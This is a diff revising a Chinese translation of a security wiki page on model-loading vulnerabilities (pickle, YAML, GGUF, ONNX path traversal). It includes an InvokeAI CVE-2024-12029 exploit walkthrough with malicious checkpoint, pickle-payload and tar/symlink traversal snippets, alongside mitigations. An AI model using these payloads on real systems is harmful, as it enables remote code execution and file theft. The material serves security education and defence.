@@ -15,13 +15,13 @@
 | **TensorFlow/Keras**        | **CVE-2021-37678** (不安全的 YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | 从 YAML 加载模型使用 `yaml.unsafe_load`（代码执行） <br> 使用 **Lambda** 层加载模型运行任意 Python 代码                              | |
 | TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite 解析)                                                                                          | 精心制作的 `.tflite` 模型触发整数溢出 → 堆损坏（潜在 RCE）                                                                              | |
 | **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | 通过 `joblib.load` 加载模型执行攻击者的 `__reduce__` 负载                                                                           | |
-| **NumPy** (Python)          | **CVE-2019-6446** (不安全的 `np.load`) *有争议*                                                                              | `numpy.load` 默认允许 pickle 对象数组 – 恶意的 `.npy/.npz` 触发代码执行                                                              | |
+| **NumPy** (Python)          | **CVE-2019-6446** (不安全的 `np.load`) *有争议*                                                                              | `numpy.load` 默认允许 pickle 对象数组 – 恶意 `.npy/.npz` 触发代码执行                                                                | |
 | **ONNX / ONNX Runtime**     | **CVE-2022-25882** (目录遍历) <br> **CVE-2024-5187** (tar 遍历)                                                    | ONNX 模型的外部权重路径可以逃逸目录（读取任意文件） <br> 恶意 ONNX 模型 tar 可以覆盖任意文件（导致 RCE）                               | |
-| ONNX Runtime (设计风险)  | *(无 CVE)* ONNX 自定义操作 / 控制流                                                                                    | 带有自定义操作符的模型需要加载攻击者的本地代码；复杂的模型图滥用逻辑以执行意外计算                                                      | |
+| ONNX Runtime (设计风险)    | *(无 CVE)* ONNX 自定义操作 / 控制流                                                                                    | 带有自定义操作符的模型需要加载攻击者的本地代码；复杂的模型图滥用逻辑以执行意外计算                                                      | |
 | **NVIDIA Triton Server**    | **CVE-2023-31036** (路径遍历)                                                                                          | 使用启用 `--model-control` 的模型加载 API 允许相对路径遍历以写入文件（例如，覆盖 `.bashrc` 以实现 RCE）                               | |
-| **GGML (GGUF 格式)**      | **CVE-2024-25664 … 25668** (多个堆溢出)                                                                         | 格式错误的 GGUF 模型文件导致解析器中的堆缓冲区溢出，使得在受害者系统上执行任意代码                                                      | |
-| **Keras (旧格式)**   | *(无新 CVE)* 旧版 Keras H5 模型                                                                                         | 恶意 HDF5 (`.h5`) 模型中的 Lambda 层代码在加载时仍然执行（Keras safe_mode 不涵盖旧格式 – “降级攻击”）                                   | |
-| **其他** (一般)        | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如，基于 pickle 的模型格式，Python `pickle.load`）将在未缓解的情况下执行嵌入模型文件中的任意代码                     | |
+| **GGML (GGUF 格式)**        | **CVE-2024-25664 … 25668** (多个堆溢出)                                                                         | 格式错误的 GGUF 模型文件导致解析器中的堆缓冲区溢出，使得在受害者系统上执行任意代码                                                      | |
+| **Keras (旧格式)**         | *(无新 CVE)* 旧版 Keras H5 模型                                                                                         | 恶意 HDF5 (`.h5`) 模型中的 Lambda 层代码在加载时仍然执行（Keras 安全模式不覆盖旧格式 – “降级攻击”）                                     | |
+| **其他** (一般)            | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如，基于 pickle 的模型格式，Python `pickle.load`）将执行嵌入模型文件中的任意代码，除非采取缓解措施                     | |
 
 此外，还有一些基于 Python pickle 的模型，例如 [PyTorch](https://github.com/pytorch/pytorch/security) 使用的模型，如果不使用 `weights_only=True` 加载，则可能被用来在系统上执行任意代码。因此，任何基于 pickle 的模型可能特别容易受到此类攻击，即使它们未在上表中列出。
 
@@ -33,13 +33,13 @@
 ```python
 checkpoint = torch.load(path, map_location=torch.device("meta"))
 ```
-当提供的文件是一个 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 执行 **pickle 反序列化**。由于内容直接来自用户控制的 URL，攻击者可以在 checkpoint 中嵌入一个带有自定义 `__reduce__` 方法的恶意对象；该方法在 **反序列化** 期间执行，导致 **远程代码执行 (RCE)** 在 InvokeAI 服务器上。
+当提供的文件是一个 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 执行 **pickle 反序列化**。由于内容直接来自用户控制的 URL，攻击者可以在检查点中嵌入一个带有自定义 `__reduce__` 方法的恶意对象；该方法在 **反序列化** 期间执行，导致 **远程代码执行 (RCE)** 在 InvokeAI 服务器上。
 
 该漏洞被分配为 **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %)。
 
 #### 利用过程
 
-1. 创建一个恶意 checkpoint:
+1. 创建一个恶意检查点：
 ```python
 # payload_gen.py
 import pickle, torch, os
@@ -81,7 +81,7 @@ timeout=5,
 
 * 升级到 **InvokeAI ≥ 5.4.3** – 补丁默认将 `scan=True`，并在反序列化之前执行恶意软件扫描。
 * 在程序中加载检查点时使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) 辅助工具。
-* 强制执行模型源的允许列表/签名，并以最小权限运行服务。
+* 强制执行模型来源的允许列表/签名，并以最小权限运行服务。
 
 > ⚠️ 请记住，**任何** 基于 Python pickle 的格式（包括许多 `.pt`、`.pkl`、`.ckpt`、`.pth` 文件）从不受信任的来源反序列化本质上是不安全的。
 
@@ -94,7 +94,7 @@ deny all;                       # block direct Internet access
 allow 10.0.0.0/8;               # only internal CI network can call it
 }
 ```
-## 示例 – 创建恶意的 PyTorch 模型
+## 示例 – 创建恶意 PyTorch 模型
 
 - 创建模型：
 ```python
@@ -131,11 +131,11 @@ model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
 
 # /tmp/pwned.txt is created even if you get an error
 ```
-## Models to Path Traversal
+## 模型到路径遍历
 
-正如在[**这篇博客文章**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)中所述，不同AI框架使用的大多数模型格式基于归档，通常是`.zip`。因此，可能可以利用这些格式执行路径遍历攻击，从而允许读取加载模型的系统中的任意文件。
+正如在 [**这篇博客文章**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) 中所述，不同 AI 框架使用的大多数模型格式基于归档，通常是 `.zip`。因此，可能可以利用这些格式执行路径遍历攻击，从而允许读取加载模型的系统中的任意文件。
 
-例如，使用以下代码，您可以创建一个模型，当加载时将在`/tmp`目录中创建一个文件：
+例如，使用以下代码，您可以创建一个模型，当加载时将在 `/tmp` 目录中创建一个文件：
 ```python
 import tarfile
 
@@ -161,9 +161,9 @@ with tarfile.open("symlink_demo.model", "w:gz") as tf:
 tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
 tf.add(PAYLOAD)                      # rides the symlink
 ```
-## 参考文献
+## 参考
 
-- [OffSec 博客 – "CVE-2024-12029 – InvokeAI 不受信任数据的反序列化"](https://www.offsec.com/blog/cve-2024-12029/)
+- [OffSec 博客 – "CVE-2024-12029 – InvokeAI 不可信数据的反序列化"](https://www.offsec.com/blog/cve-2024-12029/)
 - [InvokeAI 补丁提交 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
 - [Rapid7 Metasploit 模块文档](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
 - [PyTorch – torch.load 的安全考虑](https://pytorch.org/docs/stable/notes/serialization.html#security)
